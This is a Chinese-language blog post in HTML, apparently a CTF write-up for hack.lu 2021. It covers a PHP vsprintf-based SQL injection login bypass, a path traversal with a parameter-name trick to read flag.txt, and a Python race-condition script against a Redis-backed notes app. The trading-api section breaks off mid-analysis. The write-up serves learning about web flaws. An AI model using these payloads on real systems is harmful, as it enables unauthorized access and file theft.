<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>2021hack.lu - Tlife</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Tlife"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Tlife"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Diamond Safe下载源码:  虽然存在过滤函数 但是问题不大，因为存在格式化字符串漏洞 我们的最终目的应该是构造出万能密码，然后成功登陆即可阅读源码，可以发现%s后面会被替换成’%s’如果我们想成功登录，那么就要闭合前面的引号，逃逸出一个单引号查询语句为: SELECT * FROM &amp;#96;users&amp;#96; where password&amp;#x3D;sha1(%s) and name"><meta property="og:type" content="article"><meta property="og:title" content="2021hack.lu"><meta property="og:url" content="http://example.com/2021/10/31/2021hack-lu/"><meta property="og:site_name" content="Tlife"><meta property="og:description" content="Diamond Safe下载源码:  虽然存在过滤函数 但是问题不大，因为存在格式化字符串漏洞 我们的最终目的应该是构造出万能密码，然后成功登陆即可阅读源码，可以发现%s后面会被替换成’%s’如果我们想成功登录，那么就要闭合前面的引号，逃逸出一个单引号查询语句为: SELECT * FROM &amp;#96;users&amp;#96; where password&amp;#x3D;sha1(%s) and name"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211031103819.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211103210956.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211031104724.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104005441.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104111112.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144104.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144438.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144505.png"><meta property="article:published_time" content="2021-10-31T02:35:23.000Z"><meta property="article:modified_time" content="2021-11-07T01:23:27.607Z"><meta property="article:author" content="vague huang"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211031103819.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/10/31/2021hack-lu/"},"headline":"2021hack.lu","image":["https://raw.githubusercontent.com/Hwwg/myphoto/master/20211031103819.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20211103210956.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20211031104724.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104005441.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104111112.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144104.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144438.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144505.png"],"datePublished":"2021-10-31T02:35:23.000Z","dateModified":"2021-11-07T01:23:27.607Z","author":{"@type":"Person","name":"vague huang"},"publisher":{"@type":"Organization","name":"Tlife","logo":{"@type":"ImageObject"}},"description":"Diamond Safe下载源码:  虽然存在过滤函数 但是问题不大，因为存在格式化字符串漏洞 我们的最终目的应该是构造出万能密码，然后成功登陆即可阅读源码，可以发现%s后面会被替换成’%s’如果我们想成功登录，那么就要闭合前面的引号，逃逸出一个单引号查询语句为: SELECT * FROM &#96;users&#96; where password&#x3D;sha1(%s) and name"}</script><link rel="canonical" href="http://example.com/2021/10/31/2021hack-lu/"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">Tlife</a></div><div class="navbar-menu"><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-10-31T02:35:23.000Z" title="2021/10/31 上午10:35:23">2021-10-31</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-11-07T01:23:27.607Z" title="2021/11/7 上午9:23:27">2021-11-07</time></span></div></div><h1 class="title is-3 is-size-4-mobile">2021hack.lu</h1><div class="content"><h2 id="Diamond-Safe"><a href="#Diamond-Safe" class="headerlink" title="Diamond Safe"></a>Diamond Safe</h2><p>下载源码:</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211031103819.png" alt="img"></p>
<p>虽然存在过滤函数<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211103210956.png" alt="img" style="zoom:67%;"></p>
<p>但是问题不大，因为存在格式化字符串漏洞<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211031104724.png" alt="img" style="zoom:67%;"></p>
<p>我们的最终目的应该是构造出万能密码，然后成功登陆即可<br>阅读源码，可以发现%s后面会被替换成’%s’如果我们想成功登录，那么就要闭合前面的引号，逃逸出一个单引号<br>查询语句为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM &#96;users&#96; where password&#x3D;sha1(%s) and name&#x3D;&#39;%s&#39;</span><br></pre></td></tr></table></figure>

<p>如果我们此时仅输入单引号，那么就会被过滤函数给转义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">从&#39;变成\&#39;</span><br></pre></td></tr></table></figure>

<p>因为存在格式化字符串漏洞，我们可以利用这里%会吃字符的特性，吃掉\</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="string">&quot;name=&#x27;%\&quot;;</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=vsprintf(<span class="subst">$a</span>,&#x27;a&#x27;);</span></span><br><span class="line"><span class="string">echo <span class="subst">$b</span>;</span></span><br><span class="line"><span class="string">#name=&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>如果我们可以在转义之前就插入<code>%&#39;</code>，那么后面转义后就变成<code>%\&#39;</code>，此时在经过vsprintf函数，就会变成只剩下单引号以后的内容<code>&#39;</code>,但此时会引起语法上报错，因为有两个%，但是后面只有一个参数，匹配不上，而在格式化字符串中匹配中没有<code>%1$&#39;</code>这个格式，将会被直接舍弃掉,这个就不会引起报错了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;name=&#x27;%\&#x27;%s&quot;</span>;</span><br><span class="line">$b=vsprintf($a,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="comment">#Warning: vsprintf(): Too few arguments in</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;name=&#x27;%1$\&#x27;%s&quot;</span>;</span><br><span class="line">$b=vsprintf($a,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="comment">#name=&#x27;&#x27;a</span></span><br></pre></td></tr></table></figure>

<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p>来分析一下他代码的执行过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#先尝试password&#x3D;1%1$&#39;) or 1&#x3D;1#</span><br><span class="line">则(转义后)变成:</span><br><span class="line">1%$1\&#39;) or 1&#x3D;1#</span><br><span class="line">然后变成</span><br><span class="line">SELECT * FROM &#96;users&#96; where password&#x3D;sha1(&#39;1%1$\&#39;) or 1 &#x3D; 1#&#39;)</span><br><span class="line">此时还需要在经过sprintf才能消去%1$\让单引号逃逸出来，所以还要在post一次name让他在经过一次sprintf，此时即可登录成功</span><br><span class="line">最终payload</span><br><span class="line">password&#x3D;1%1$&#39;) or 1&#x3D;1#&amp;name&#x3D;a</span><br></pre></td></tr></table></figure>

 <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104005441.png" alt="img" style="zoom:67%;">

<p>登陆成功以后仅仅只是个开始，再来看看源码，提供了下载功能，意味着我们可以文件下载来读取flag，但是存在一点，我们不知道secret，所以无法伪造那个sha加密，但是我们现在有现成的两个文件，他们有提供这个sha加密的结果<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104111112.png" alt="img" style="zoom:67%;"></p>
<p>但是如果我们直接传入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?h&#x3D;f2d03c27433d3643ff5d20f1409cb013&amp;file_name&#x3D;FlagNotHere.txt&amp;file_name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br></pre></td></tr></table></figure>

<p>原本的的file_name将会直接被覆盖，就过不去后面的hash比对<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144104.png" alt="img"></p>
<p>所以这里就利用QUERY_STRING传入的不会urldecode，还有在php中空格会自动解析为_的特性把上面的payload改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?h&#x3D;f2d03c27433d3643ff5d20f1409cb013&amp;file_name&#x3D;FlagNotHere.txt&amp;file%20name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br></pre></td></tr></table></figure>

<p> 此时可以发现，两个检测时值互相不覆盖<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144438.png" alt="img"></p>
<p>而后空格被解析为下划线，当面对两个file_name值的时候，php就会默认选择后者<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144505.png" alt="img"></p>
<p>此时就可以下载得到flag了</p>
<h2 id="NODENB"><a href="#NODENB" class="headerlink" title="NODENB"></a>NODENB</h2><p>注册登录以后，来看看源码，他使用的是redis的数据库，所以命令集都是redis的，并且可以直接调用，但是对于redis的命令都比较陌生，所以要学习一下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> db = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> asyncBinds = [</span><br><span class="line">    <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setnx&#x27;</span>, <span class="string">&#x27;incr&#x27;</span>, <span class="string">&#x27;exists&#x27;</span>, <span class="string">&#x27;del&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;hget&#x27;</span>, <span class="string">&#x27;hset&#x27;</span>, <span class="string">&#x27;hgetall&#x27;</span>, <span class="string">&#x27;hmset&#x27;</span>, <span class="string">&#x27;hexists&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sadd&#x27;</span>, <span class="string">&#x27;srem&#x27;</span>, <span class="string">&#x27;smembers&#x27;</span>, <span class="string">&#x27;sismember&#x27;</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p>主要看看和flag有关的，首先是创了一个用户叫做system，然后这里就是创建了一个note库？然后里面有个flag表，然后他有个字段title叫FLAG，值为FLAG，来自于前面定义的环境变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">db.hset(<span class="string">&#x27;uid:1&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">db.set(<span class="string">&#x27;user:system&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">db.setnx(<span class="string">&#x27;index:uid&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">db.hmset(<span class="string">&#x27;note:flag&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;Flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: FLAG,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>很明显，需要从这里得到，访问/notes/flag，接下来他会校验id</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/notes/:nid&#x27;</span>, ensureAuth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; nid &#125; = req.params;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">await</span> db.hasUserNoteAcess(req.session.user.id, nid)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/notes&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> note = <span class="keyword">await</span> db.getNote(nid);</span><br><span class="line">    res.render(<span class="string">&#x27;note&#x27;</span>, &#123; note &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这里看一下他是如何进行校验的,第一个比较时肯定可以过的，第二个是比较用户名是否存在于对应的hash表</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> hasUserNoteAcess(uid, nid) &#123;</span><br><span class="line"><span class="comment">//Redis Sismember 命令判断成员元素是否是集合的成员,nid为flag，那一定是，这个是表里有的</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">await</span> db.sismember(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:notes`</span>, nid)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//Hexists 命令用于查看哈希表的指定字段是否存在</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">await</span> db.hexists(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>`</span>, <span class="string">&#x27;hash&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// system user has no password</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<p>按照上面的逻辑，就是我们要先登录system的账号，然后才可以访问到flag，但是上面又说system是没有密码的，但是这里又需要你的密码是非空且为string，那么这里就是一个矛盾点了，怎么可能让password非空然后又符合空以后加密的hash值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!username || !password || <span class="keyword">typeof</span> username !== <span class="string">&#x27;string&#x27;</span> || <span class="keyword">typeof</span> password !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">       res.flash(<span class="string">&#x27;danger&#x27;</span>, <span class="string">&#x27;invalid username or password&#x27;</span>);</span><br><span class="line">       <span class="keyword">return</span> res.status(<span class="number">400</span>).render(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>但其实也不一定要登录，因为他验证的是会话的hash值，所以如果我们可以伪造得到这个会话，也是能达到最终目的,额很明显，伪造是不可能的，再回去看了一下上面的验证逻辑，他验证的函数是hexists，即在这个hash表中有没有这个hash值，如果没有的话，那就是true！那是不是存在当我们删除这个某个用户以后，他的session还在，但是已经没有这个hash值了呢？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">await</span> db.hexists(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>`</span>, <span class="string">&#x27;hash&#x27;</span>)) &#123;</span><br><span class="line">           <span class="comment">// system user has no password</span></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>来看看他删除的过程，这里再贴一下创建的过程会理解的比较清楚一些</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> createUser(name, password) &#123;</span><br><span class="line">       <span class="keyword">const</span> isAvailable = <span class="keyword">await</span> db.setnx(<span class="string">`user:<span class="subst">$&#123;name&#125;</span>`</span>, <span class="string">&#x27;PLACEHOLDER&#x27;</span>);</span><br><span class="line">       <span class="keyword">if</span> (!isAvailable) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;user already exists!&#x27;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">const</span> uid = <span class="keyword">await</span> db.incr(<span class="string">&#x27;index:uid&#x27;</span>);</span><br><span class="line">       <span class="keyword">await</span> db.set(<span class="string">`user:<span class="subst">$&#123;name&#125;</span>`</span>, uid);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">const</span> hash = <span class="keyword">await</span> argon2.hash(password);</span><br><span class="line">       <span class="keyword">await</span> db.hmset(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>`</span>, &#123; name, hash &#125;);</span><br><span class="line">       <span class="keyword">return</span> uid;</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure>

<p>对比创建和删除，可以发现，当删除了uid以后，name和对应的hash也会删除，然后session是在后面删除的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> deleteUser(uid) &#123;</span><br><span class="line">        <span class="keyword">const</span> user = <span class="keyword">await</span> helpers.getUser(uid);</span><br><span class="line">        <span class="keyword">await</span> db.set(<span class="string">`user:<span class="subst">$&#123;user.name&#125;</span>`</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">await</span> db.del(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">const</span> sessions = <span class="keyword">await</span> db.smembers(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:sessions`</span>);</span><br><span class="line">        <span class="keyword">const</span> notes = <span class="keyword">await</span> db.smembers(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:notes`</span>);</span><br><span class="line">        <span class="keyword">return</span> db.del([</span><br><span class="line">            ...sessions.map(<span class="function">(<span class="params">sid</span>) =&gt;</span> <span class="string">`sess:<span class="subst">$&#123;sid&#125;</span>`</span>),</span><br><span class="line">            ...notes.map(<span class="function">(<span class="params">nid</span>) =&gt;</span> <span class="string">`note:<span class="subst">$&#123;nid&#125;</span>`</span>),</span><br><span class="line">            <span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:sessions`</span>,</span><br><span class="line">            <span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:notes`</span>,</span><br><span class="line">        ]);</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<p>而在这个模块中，有延时存在，进入flash以后会对session进行操作，可以理解为暂时替我们保留了一会session</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.query.random) &#123;</span><br><span class="line">        <span class="keyword">const</span> ms = <span class="built_in">Math</span>.floor(<span class="number">2000</span> + <span class="built_in">Math</span>.random() * <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(r, ms));</span><br><span class="line">        res.flash(<span class="string">&#x27;info&#x27;</span>, <span class="string">`Our AI ran <span class="subst">$&#123;ms&#125;</span>ms to generate this piece of groundbreaking research.`</span>);</span><br><span class="line">        content = <span class="string">&#x27;Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>创建用户，然后启用延时功能，在删除该用户的同时，使用它的session访问notes/flag表，但是我试了几次都没成功，想着会不会是手速不够快？这里涉及到多进程并行的情况，学习一下这个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">multiprocessing</span>.<span class="title">Process</span>(<span class="params">group=None, target=None, name=None, args=(<span class="params"></span>), kwargs=&#123;&#125;, *, daemon=None</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">start</span>()方法启动，这样创建进程比<span class="title">fork</span>()还要简单。</span></span><br><span class="line"><span class="class"><span class="title">join</span>()方法可以等待子进程结束后再继续往下运行(<span class="params">更准确地说，在当前位置阻塞主进程，带执行join（）的进程结束后再继续执行主进程</span></span></span><br><span class="line"><span class="class"><span class="params"><span class="comment">#这里说一下join方法，比如说有主进程和a和在执行，那么就是主进程执行然后紧跟着a.start()，遇到a.join()就会先阻塞主进程，等到a执行完毕，再执行主进程                       </span></span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://nodenb.flu.xxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">u,p</span>):</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:u,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:p</span><br><span class="line">    &#125;</span><br><span class="line">    r=s.post(url+<span class="string">&#x27;/register&#x27;</span>,data=data)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">u,p</span>):</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:u,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:p</span><br><span class="line">    &#125;</span><br><span class="line">    r=s.post(url+<span class="string">&#x27;/login&#x27;</span>,data=data)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteme</span>():</span></span><br><span class="line">    r=s.post(url+<span class="string">&quot;/deleteme&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    r=s.get(url+<span class="string">&quot;/notes/flag&quot;</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep_notes</span>(<span class="params">title,content,s</span>):</span></span><br><span class="line">    p=<span class="string">&quot;/notes?random=true&quot;</span></span><br><span class="line">    r=s.post(url+p,data=&#123;<span class="string">&#x27;title&#x27;</span>:title,<span class="string">&#x27;content&#x27;</span>:content&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = requests.session()</span><br><span class="line">        u = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)])</span><br><span class="line">        p = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)])</span><br><span class="line">        r1=register(u,p)</span><br><span class="line">        l1=login(u,p)</span><br><span class="line">        print(<span class="string">&quot;a&quot;</span>,s.cookies)</span><br><span class="line">        c=s.cookies.get(<span class="string">&quot;connect.sid&quot;</span>)</span><br><span class="line">        p=Process(target=sleep_notes,args=(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,s))</span><br><span class="line">        p.start()</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        d=deleteme()</span><br><span class="line">        p.join()</span><br><span class="line">        s.cookies.update(&#123;<span class="string">&quot;connect.sid&quot;</span>:c&#125;)</span><br><span class="line">        r=get_flag()</span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">&quot;flag&quot;</span>,r.text):</span><br><span class="line">            print()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>最后还是没出来。头晕了–</p>
<h2 id="trading-api-High"><a href="#trading-api-High" class="headerlink" title="trading-api(High)"></a>trading-api(High)</h2><p>js文件有点多，从页面入手吧，一开始他说我们没有tooken</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authn</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> authHeader = req.header(<span class="string">&#x27;authorization&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!authHeader) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;missing auth token&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        req.user = jsonwebtoken.verify(authHeader, JWT_SECRET);</span><br><span class="line">        next();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.status(<span class="number">401</span>).send(<span class="string">&#x27;invalid auth token&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以来看看login的地方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">async function login(req, res) &#123;</span><br><span class="line">    const &#123; username, password &#125; &#x3D; req.body;</span><br><span class="line">    if (!username || !password) &#123;</span><br><span class="line">        return res.status(400).send(&#39;missing username or password&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        const r &#x3D; await got.post(&#96;$&#123;AUTH_SERVICE&#125;&#x2F;api&#x2F;users&#x2F;$&#123;encodeURI(username)&#125;&#x2F;auth&#96;, &#123;</span><br><span class="line">            headers: &#123; authorization: AUTH_API_TOKEN &#125;,</span><br><span class="line">            json: &#123; password &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">        if (r.statusCode !&#x3D;&#x3D; 200) &#123;</span><br><span class="line">            return res.status(401).send(&#39;wrong&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const jwt &#x3D; jsonwebtoken.sign(&#123; username &#125;, JWT_SECRET);</span><br><span class="line">        return res.json(&#123; token: jwt &#125;);</span><br><span class="line">    &#125; catch (error) &#123;</span><br><span class="line">        return res.status(503).end(&#39;error&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/11/01/2021%E4%B8%9C%E5%8D%8E%E6%9D%AF-suid%E6%8F%90%E6%9D%83/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2021东华杯</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/10/20/wireshark%E5%B7%A5%E5%85%B7%E6%93%8D%E4%BD%9C/"><span class="level-item">wireshark工具操作</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">Tlife</a><p class="is-size-7"><span>&copy; 2023 vague huang</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
